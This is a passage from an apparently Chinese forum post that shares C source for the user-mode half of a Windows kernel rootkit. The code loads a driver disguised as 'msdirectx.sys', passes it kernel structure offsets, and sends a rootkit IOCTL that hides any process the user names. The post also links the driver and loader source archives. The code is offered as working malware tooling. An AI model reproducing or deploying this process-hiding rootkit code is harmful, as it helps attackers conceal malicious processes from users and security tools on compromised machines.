
```c
    else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2 )
    {
        pid_offset = 132;
        flink_offset = 136;
        authid_offset = 24;
        token_offset = 200;
        privcount_offset = 84;
        privaddr_offset  = 116;
        sidcount_offset = 76;
        sidaddr_offset  = 104;
        Found = TRUE;
    }

    break;

    default:
      fprintf(stderr, "\nOperating System Version %d.%d Not Supported!\n", osvi.dwMajorVersion, osvi.dwMinorVersion);
      return -1;
      break;

  }

  if (!Found)
  {
    return -1;
  }

    os_offsets = (int *)calloc(1, sizeof(int)*8);
  if (!os_offsets)
  {
      //fprintf(stderr, "Memory allocation failed.\n");
      return -1;
  }

  memcpy(os_offsets, &pid_offset, sizeof(int));
  memcpy(os_offsets + 1, &flink_offset, sizeof(int));
  memcpy(os_offsets + 2, &authid_offset, sizeof(int));
  memcpy(os_offsets + 3, &token_offset, sizeof(int));
  memcpy(os_offsets + 4, &privcount_offset, sizeof(int));
  memcpy(os_offsets + 5, &privaddr_offset, sizeof(int));
  memcpy(os_offsets + 6, &sidcount_offset, sizeof(int));
  memcpy(os_offsets + 7, &sidaddr_offset, sizeof(int));

  stProcess.dwSize=sizeof(stProcess);
  hSnapShot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
  status=Process32First(hSnapShot,&stProcess);//用快照函数获取进程 ID
  while(status)
  {
    if(!strcmp(ProcessName,stProcess.szExeFile))
    {
        printf("the ProcessName is %s,ID is %d\n",stProcess.szExeFile,stProcess.th32ProcessID);
      pid=stProcess.th32ProcessID;
    }
    status=Process32Next(hSnapShot,&stProcess);
  }

    h_Device=CreateFile("\\\\.\\msdirectx",GENERIC_READ+GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);//!=INVALID_HANDLE_VALUE)
  if(h_Device!=INVALID_HANDLE_VALUE)
  {
       if(!DeviceIoControl(h_Device, IOCTL_ROOTKIT_INIT,
             os_offsets,
             sizeof(int)*8,
             NULL,
             0,
             &d_bytesRead,
             NULL))
       return -1;

         success = DeviceIoControl(h_Device,
          IOCTL_ROOTKIT_HIDE,
          (void *) &pid,
          sizeof(DWORD),
          NULL,
          0,
          &d_bytesRead,
          NULL);

  }
  else
  {
    printf("can not open device\n");
    return success;
  }
  CloseHandle(h_Device);
  return success;

}

BOOL DeleteDeviceDriver()//char *DriverName)
{
  if(0>StopDriver(DriverName,m_szDriverFullPath))
  {
    printf("StopDriver failed\n");
    return FALSE;
  }
  else if(0>RemoveDriver(DriverName,m_szDriverFullPath))
  {
    printf("Remove Driver failed\n");
    return FALSE;
  }
  return TRUE;
}

BOOL LoadDeviceDriver()//char *DriverName)
{
  if (GetCurrentDirectory(MAX_PATH, m_szDriverFullPath))
  {
    strncat(m_szDriverFullPath,"\\",MAX_PATH-strlen(m_szDriverFullPath));
    strncat(m_szDriverFullPath,"msdirectx.sys",MAX_PATH-strlen(m_szDriverFullPath));
    SplitFilePath(m_szDriverFullPath,ac_driverPath,DriverName,m_szDriverExt);
    if(0>InstallDriver(DriverName,m_szDriverFullPath))
    {
      printf("install failed \n");
      return FALSE;
    }
    else if(0>StartDriver(DriverName,m_szDriverFullPath))
    {
      printf("Start failed\n");
      return FALSE;
    }
  }
  return TRUE;
}

int main()
{
  const int PROCNAMELEN=26;
  char *buffer,*start,*ProcessName=new char[MAX_PATH];
  printf("输入隐藏进程名\n");
  scanf("%s",ProcessName);

     if(!LoadDeviceDriver())//sz_drivername))//启动驱动程序
     return 0;
  HideProc(ProcessName);//隐藏进程
  if(!(DeleteDeviceDriver()))//sz_drivername)))
    return 0;
//  printf("Hello World!\n");
  return 0;
}

/*
void main()
{
}*/
```

补充说明，以上程序是部分修改 `Rootkits-windows` 内核的安全防护 源码得到的。拿出给大家分享。

忘了上传源码，补上去

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `驱动程序.rar`
|
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `用户空间程序.rar` \[解压密码：`pediy`\]
|
